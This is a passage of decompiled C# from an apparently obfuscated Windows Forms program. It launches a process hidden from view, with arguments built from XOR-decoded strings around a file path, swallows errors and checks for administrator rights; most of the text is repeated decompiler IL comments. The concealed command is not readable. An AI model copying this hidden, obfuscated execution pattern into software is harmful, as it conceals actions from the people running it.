					Arguments = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2655807A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e) + filePath + gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC902F0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a),
					UseShellExecute = false,
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden
				};
				using Process process = Process.Start(startInfo);
				process.WaitForExit(3000);
				return;
			}
		}
		catch (Exception)
		{
		}
	}

	private bool IsRunningAsAdministrator()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch
		{
			return false;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Expected O, but got Unknown
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b8: Expected O, but got Unknown
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Expected O, but got Unknown
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Expected O, but got Unknown
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Expected O, but got Unknown
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected O, but got Unknown
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Expected O, but got Unknown
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Expected O, but got Unknown
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Expected O, but got Unknown
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Expected O, but got Unknown
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected O, but got Unknown
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0147: Expected O, but got Unknown
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Expected O, but got Unknown
		//IL_0153: Unknown result type (might be due to invalid IL or missing references)
		//IL_015d: Expected O, but got Unknown
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Expected O, but got Unknown
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_017e: Expected O, but got Unknown
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0189: Expected O, but got Unknown
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Expected O, but got Unknown
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		//IL_019f: Expected O, but got Unknown
		//IL_01a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01aa: Expected O, but got Unknown
		//IL_01ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b5: Expected O, but got Unknown
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c0: Expected O, but got Unknown
		//IL_01c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cb: Expected O, but got Unknown
		//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Expected O, but got Unknown
		//IL_01d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e1: Expected O, but got Unknown
		//IL_01e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ec: Expected O, but got Unknown
		//IL_01ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f7: Expected O, but got Unknown
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0202: Expected O, but got Unknown
		//IL_0203: Unknown result type (might be due to invalid IL or missing references)
		//IL_020d: Expected O, but got Unknown
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0218: Expected O, but got Unknown
		//IL_0219: Unknown result type (might be due to invalid IL or missing references)
		//IL_0223: Expected O, but got Unknown
		//IL_0224: Unknown result type (might be due to invalid IL or missing references)
		//IL_022e: Expected O, but got Unknown
		//IL_022f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0239: Expected O, but got Unknown
		//IL_023a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0244: Expected O, but got Unknown
		//IL_0245: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Expected O, but got Unknown
		//IL_0250: Unknown result type (might be due to invalid IL or missing references)
		//IL_025a: Expected O, but got Unknown
		//IL_025b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0265: Expected O, but got Unknown
		//IL_0266: Unknown result type (might be due to invalid IL or missing references)
		//IL_0270: Expected O, but got Unknown
		//IL_0271: Unknown result type (might be due to invalid IL or missing references)
		//IL_027b: Expected O, but got Unknown
		//IL_027c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0286: Expected O, but got Unknown
		//IL_0287: Unknown result type (might be due to invalid IL or missing references)
		//IL_0291: Expected O, but got Unknown
		//IL_0292: Unknown result type (might be due to invalid IL or missing references)
		//IL_029c: Expected O, but got Unknown
		//IL_029d: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a7: Expected O, but got Unknown
		//IL_02a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b2: Expected O, but got Unknown
		//IL_02b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bd: Expected O, but got Unknown
		//IL_02be: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c8: Expected O, but got Unknown
		//IL_02c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d3: Expected O, but got Unknown
		//IL_02d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02de: Expected O, but got Unknown
		//IL_02df: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e9: Expected O, but got Unknown
		//IL_02ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Expected O, but got Unknown
		//IL_02f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ff: Expected O, but got Unknown
		//IL_0300: Unknown result type (might be due to invalid IL or missing references)
		//IL_030a: Expected O, but got Unknown
		//IL_030b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0315: Expected O, but got Unknown
		//IL_0316: Unknown result type (might be due to invalid IL or missing references)
		//IL_0320: Expected O, but got Unknown
		//IL_0321: Unknown result type (might be due to invalid IL or missing references)
		//IL_032b: Expected O, but got Unknown
		//IL_032c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0336: Expected O, but got Unknown
		//IL_0337: Unknown result type (might be due to invalid IL or missing references)
		//IL_0341: Expected O, but got Unknown
		//IL_0342: Unknown result type (might be due to invalid IL or missing references)
		//IL_034c: Expected O, but got Unknown
		//IL_034d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0357: Expected O, but got Unknown
		//IL_0358: Unknown result type (might be due to invalid IL or missing references)
		//IL_0362: Expected O, but got Unknown
		//IL_0363: Unknown result type (might be due to invalid IL or missing references)
		//IL_036d: Expected O, but got Unknown
		//IL_036e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0378: Expected O, but got Unknown
		//IL_0379: Unknown result type (might be due to invalid IL or missing references)
		//IL_0383: Expected O, but got Unknown
		//IL_0384: Unknown result type (might be due to invalid IL or missing references)
		//IL_038e: Expected O, but got Unknown
		//IL_038f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0399: Expected O, but got Unknown
		//IL_039a: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a4: Expected O, but got Unknown
		//IL_03a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03af: Expected O, but got Unknown
		//IL_03b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ba: Expected O, but got Unknown
		//IL_03bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c5: Expected O, but got Unknown
		//IL_03c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d0: Expected O, but got Unknown
		//IL_03d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03db: Expected O, but got Unknown
		//IL_03dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e6: Expected O, but got Unknown
		//IL_03e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f1: Expected O, but got Unknown
		//IL_03f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fc: Expected O, but got Unknown
		//IL_03fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0407: Expected O, but got Unknown
		//IL_0408: Unknown result type (might be due to invalid IL or missing references)
		//IL_0412: Expected O, but got Unknown
		//IL_0413: Unknown result type (might be due to invalid IL or missing references)
		//IL_041d: Expected O, but got Unknown
		//IL_041e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0428: Expected O, but got Unknown
		//IL_0429: Unknown result type (might be due to invalid IL or missing references)
		//IL_0433: Expected O, but got Unknown
		//IL_0434: Unknown result type (might be due to invalid IL or missing references)
		//IL_043e: Expected O, but got Unknown
		//IL_043f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0449: Expected O, but got Unknown
		//IL_044a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0454: Expected O, but got Unknown
		//IL_0455: Unknown result type (might be due to invalid IL or missing references)
		//IL_045f: Expected O, but got Unknown
		//IL_0460: Unknown result type (might be due to invalid IL or missing references)
		//IL_046a: Expected O, but got Unknown
		//IL_046b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0475: Expected O, but got Unknown
		//IL_0476: Unknown result type (might be due to invalid IL or missing references)
		//IL_0480: Expected O, but got Unknown
		//IL_0481: Unknown result type (might be due to invalid IL or missing references)
		//IL_048b: Expected O, but got Unknown
		//IL_048c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0496: Expected O, but got Unknown
		//IL_0497: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a1: Expected O, but got Unknown
		//IL_04a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ac: Expected O, but got Unknown
		//IL_04ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b7: Expected O, but got Unknown
		//IL_04b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c2: Expected O, but got Unknown
		//IL_04c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04cd: Expected O, but got Unknown
		//IL_04ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d8: Expected O, but got Unknown
		//IL_04d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e3: Expected O, but got Unknown
		//IL_04e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ee: Expected O, but got Unknown
		//IL_04ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f9: Expected O, but got Unknown
		//IL_04fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0504: Expected O, but got Unknown
		//IL_0505: Unknown result type (might be due to invalid IL or missing references)
		//IL_050f: Expected O, but got Unknown
		//IL_0510: Unknown result type (might be due to invalid IL or missing references)
		//IL_051a: Expected O, but got Unknown
		//IL_051b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0525: Expected O, but got Unknown
		//IL_0526: Unknown result type (might be due to invalid IL or missing references)
		//IL_0530: Expected O, but got Unknown
		//IL_0531: Unknown result type (might be due to invalid IL or missing references)
		//IL_053b: Expected O, but got Unknown
		//IL_053c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0546: Expected O, but got Unknown
		//IL_0547: Unknown result type (might be due to invalid IL or missing references)
		//IL_0551: Expected O, but got Unknown
		//IL_0552: Unknown result type (might be due to invalid IL or missing references)
		//IL_055c: Expected O, but got Unknown
		//IL_055d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0567: Expected O, but got Unknown
		//IL_0568: Unknown result type (might be due to invalid IL or missing references)
		//IL_0572: Expected O, but got Unknown
		//IL_0573: Unknown result type (might be due to invalid IL or missing references)
		//IL_057d: Expected O, but got Unknown
		//IL_057e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0588: Expected O, but got Unknown
		//IL_0589: Unknown result type (might be due to invalid IL or missing references)
		//IL_0593: Expected O, but got Unknown
		//IL_0594: Unknown result type (might be due to invalid IL or missing references)
		//IL_059e: Expected O, but got Unknown
		//IL_059f: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a9: Expected O, but got Unknown
		//IL_05aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b4: Expected O, but got Unknown
		//IL_05b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_05bf: Expected O, but got Unknown
		//IL_05c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ca: Expected O, but got Unknown
		//IL_05cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d5: Expected O, but got Unknown
		//IL_05d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e0: Expected O, but got Unknown
		//IL_05e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05eb: Expected O, but got Unknown
		//IL_05ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f6: Expected O, but got Unknown
		//IL_05f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0601: Expected O, but got Unknown
		//IL_0602: Unknown result type (might be due to invalid IL or missing references)
		//IL_060c: Expected O, but got Unknown
		//IL_060d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0617: Expected O, but got Unknown
		//IL_0618: Unknown result type (might be due to invalid IL or missing references)
		//IL_0622: Expected O, but got Unknown
		//IL_0623: Unknown result type (might be due to invalid IL or missing references)
		//IL_062d: Expected O, but got Unknown
		//IL_062e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0638: Expected O, but got Unknown
		//IL_0639: Unknown result type (might be due to invalid IL or missing references)
		//IL_0643: Expected O, but got Unknown
		//IL_0644: Unknown result type (might be due to invalid IL or missing references)
		//IL_064e: Expected O, but got Unknown
		//IL_064f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0659: Expected O, but got Unknown
		//IL_065a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0664: Expected O, but got Unknown
		//IL_0665: Unknown result type (might be due to invalid IL or missing references)
		//IL_066f: Expected O, but got Unknown
		//IL_0670: Unknown result type (might be due to invalid IL or missing references)
		//IL_067a: Expected O, but got Unknown
		//IL_067b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0685: Expected O, but got Unknown
		//IL_0686: Unknown result type (might be due to invalid IL or missing references)
		//IL_0690: Expected O, but got Unknown
		//IL_0691: Unknown result type (might be due to invalid IL or missing references)
		//IL_069b: Expected O, but got Unknown
		//IL_069c: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a6: Expected O, but got Unknown
		//IL_06a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b1: Expected O, but got Unknown
		//IL_06b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bc: Expected O, but got Unknown
		//IL_06bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c7: Expected O, but got Unknown
		//IL_06c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d2: Expected O, but got Unknown
		//IL_06d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_06dd: Expected O, but got Unknown
		//IL_06de: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e8: Expected O, but got Unknown
		//IL_06e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f3: Expected O, but got Unknown
		//IL_06f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06fe: Expected O, but got Unknown
		//IL_06ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0709: Expected O, but got Unknown
		//IL_070a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0714: Expected O, but got Unknown
		//IL_0715: Unknown result type (might be due to invalid IL or missing references)
		//IL_071f: Expected O, but got Unknown
		//IL_0720: Unknown result type (might be due to invalid IL or missing references)
		//IL_072a: Expected O, but got Unknown
		//IL_072b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0735: Expected O, but got Unknown
		//IL_0736: Unknown result type (might be due to invalid IL or missing references)
		//IL_0740: Expected O, but got Unknown
		//IL_0741: Unknown result type (might be due to invalid IL or missing references)
		//IL_074b: Expected O, but got Unknown
		//IL_074c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0756: Expected O, but got Unknown
		//IL_0757: Unknown result type (might be due to invalid IL or missing references)
		//IL_0761: Expected O, but got Unknown
		//IL_0762: Unknown result type (might be due to invalid IL or missing references)
		//IL_076c: Expected O, but got Unknown
		//IL_076d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0777: Expected O, but got Unknown
		//IL_0778: Unknown result type (might be due to invalid IL or missing references)
		//IL_0782: Expected O, but got Unknown
		//IL_0783: Unknown result type (might be due to invalid IL or missing references)
		//IL_078d: Expected O, but got Unknown
		//IL_078e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0798: Expected O, but got Unknown
		//IL_0799: Unknown result type (might be due to invalid IL or missing references)
		//IL_07a3: Expected O, but got Unknown
		//IL_07a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ae: Expected O, but got Unknown
		//IL_07af: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b9: Expected O, but got Unknown
		//IL_07ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c4: Expected O, but got Unknown
		//IL_07c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_07cf: Expected O, but got Unknown
		//IL_07d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07da: Expected O, but got Unknown
		//IL_07db: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e5: Expected O, but got Unknown
		//IL_07e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f0: Expected O, but got Unknown
		//IL_07f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_07fb: Expected O, but got Unknown
		//IL_07fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0806: Expected O, but got Unknown
		//IL_0807: Unknown result type (might be due to invalid IL or missing references)
		//IL_0811: Expected O, but got Unknown
		//IL_0812: Unknown result type (might be due to invalid IL or missing references)
		//IL_081c: Expected O, but got Unknown
		//IL_081d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0827: Expected O, but got Unknown
		//IL_0828: Unknown result type (might be due to invalid IL or missing references)
		//IL_0832: Expected O, but got Unknown
		//IL_0833: Unknown result type (might be due to invalid IL or missing references)
		//IL_083d: Expected O, but got Unknown
		//IL_083e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0848: Expected O, but got Unknown
		//IL_0849: Unknown result type (might be due to invalid IL or missing references)
		//IL_0853: Expected O, but got Unknown
		//IL_0854: Unknown result type (might be due to invalid IL or missing references)
		//IL_085e: Expected O, but got Unknown
		//IL_085f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0869: Expected O, but got Unknown
		//IL_086a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0874: Expected O, but got Unknown
		//IL_0875: Unknown result type (might be due to invalid IL or missing references)
		//IL_087f: Expected O, but got Unknown
		//IL_0880: Unknown result type (might be due to invalid IL or missing references)
		//IL_088a: Expected O, but got Unknown
		//IL_088b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0895: Expected O, but got Unknown
		//IL_0896: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a0: Expected O, but got Unknown
		//IL_08a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ab: Expected O, but got Unknown
		//IL_08ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b6: Expected O, but got Unknown
		//IL_08b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_08c1: Expected O, but got Unknown
		//IL_08c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_08cc: Expected O, but got Unknown
		//IL_08cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_08d7: Expected O, but got Unknown
		//IL_08d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_08e2: Expected O, but got Unknown
		//IL_08e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ed: Expected O, but got Unknown
		//IL_08ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f8: Expected O, but got Unknown
		//IL_08f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0903: Expected O, but got Unknown
		//IL_0904: Unknown result type (might be due to invalid IL or missing references)
		//IL_090e: Expected O, but got Unknown
		//IL_090f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0919: Expected O, but got Unknown
		//IL_091a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0924: Expected O, but got Unknown
		//IL_0925: Unknown result type (might be due to invalid IL or missing references)
		//IL_092f: Expected O, but got Unknown
		//IL_0930: Unknown result type (might be due to invalid IL or missing references)
		//IL_093a: Expected O, but got Unknown
		//IL_093b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0945: Expected O, but got Unknown
		//IL_0946: Unknown result type (might be due to invalid IL or missing references)
		//IL_0950: Expected O, but got Unknown
		//IL_0951: Unknown result type (might be due to invalid IL or missing references)
		//IL_095b: Expected O, but got Unknown
		//IL_095c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0966: Expected O, but got Unknown
		//IL_0967: Unknown result type (might be due to invalid IL or missing references)
		//IL_0971: Expected O, but got Unknown
		//IL_0972: Unknown result type (might be due to invalid IL or missing references)
		//IL_097c: Expected O, but got Unknown
		//IL_097d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0987: Expected O, but got Unknown
		//IL_0988: Unknown result type (might be due to invalid IL or missing references)
		//IL_0992: Expected O, but got Unknown
		//IL_0993: Unknown result type (might be due to invalid IL or missing references)
		//IL_099d: Expected O, but got Unknown
		//IL_099e: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a8: Expected O, but got Unknown
		//IL_09a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b3: Expected O, but got Unknown
		//IL_09b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_09be: Expected O, but got Unknown
		//IL_09bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c9: Expected O, but got Unknown
		//IL_09ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d4: Expected O, but got Unknown
		//IL_09d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_09df: Expected O, but got Unknown
		//IL_09e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ea: Expected O, but got Unknown
		//IL_09eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f5: Expected O, but got Unknown
		//IL_09f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a00: Expected O, but got Unknown
		//IL_0a01: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a0b: Expected O, but got Unknown
		//IL_0a0c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a16: Expected O, but got Unknown
		//IL_0a17: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a21: Expected O, but got Unknown
		//IL_0a22: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a2c: Expected O, but got Unknown
		//IL_0a2d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a37: Expected O, but got Unknown
		//IL_0a38: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a42: Expected O, but got Unknown
		//IL_0a43: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4d: Expected O, but got Unknown
		//IL_0a4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a58: Expected O, but got Unknown
		//IL_0a59: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a63: Expected O, but got Unknown
		//IL_0a64: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a6e: Expected O, but got Unknown
		//IL_0a6f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a79: Expected O, but got Unknown
		//IL_0a7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a84: Expected O, but got Unknown
		//IL_0a85: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a8f: Expected O, but got Unknown
		//IL_0a90: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a9a: Expected O, but got Unknown
		//IL_0a9b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa5: Expected O, but got Unknown
		//IL_0aa6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab0: Expected O, but got Unknown
		//IL_0ab1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0abb: Expected O, but got Unknown
		//IL_0abc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac6: Expected O, but got Unknown
		//IL_0ac7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ad1: Expected O, but got Unknown
		//IL_0ad2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0adc: Expected O, but got Unknown
		//IL_0add: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ae7: Expected O, but got Unknown
		//IL_0ae8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af2: Expected O, but got Unknown
		//IL_0af3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0afd: Expected O, but got Unknown
		//IL_0afe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b08: Expected O, but got Unknown
		//IL_0b09: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b13: Expected O, but got Unknown
		//IL_0b14: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1e: Expected O, but got Unknown
		//IL_0b1f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b29: Expected O, but got Unknown
		//IL_0b2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b34: Expected O, but got Unknown
		//IL_0b35: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b3f: Expected O, but got Unknown
		//IL_0b40: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4a: Expected O, but got Unknown
		//IL_0b4b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b55: Expected O, but got Unknown
		//IL_0b56: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b60: Expected O, but got Unknown
		//IL_0b61: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b6b: Expected O, but got Unknown
		//IL_0b6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b76: Expected O, but got Unknown
		//IL_0b77: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b81: Expected O, but got Unknown
		//IL_0b82: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b8c: Expected O, but got Unknown
		//IL_0b8d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b97: Expected O, but got Unknown
		//IL_0b98: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ba2: Expected O, but got Unknown
		//IL_0ba3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bad: Expected O, but got Unknown
		//IL_0bae: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bb8: Expected O, but got Unknown
		//IL_0bb9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc3: Expected O, but got Unknown
		//IL_0bc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bce: Expected O, but got Unknown
		//IL_0bcf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd9: Expected O, but got Unknown
		//IL_0bda: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be4: Expected O, but got Unknown
		//IL_0e64: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ea1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f44: Unknown result type (might be due to invalid IL or missing references)
		//IL_1003: Unknown result type (might be due to invalid IL or missing references)
		//IL_10c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_11b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_12a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_135f: Unknown result type (might be due to invalid IL or missing references)
		//IL_141b: Unknown result type (might be due to invalid IL or missing references)
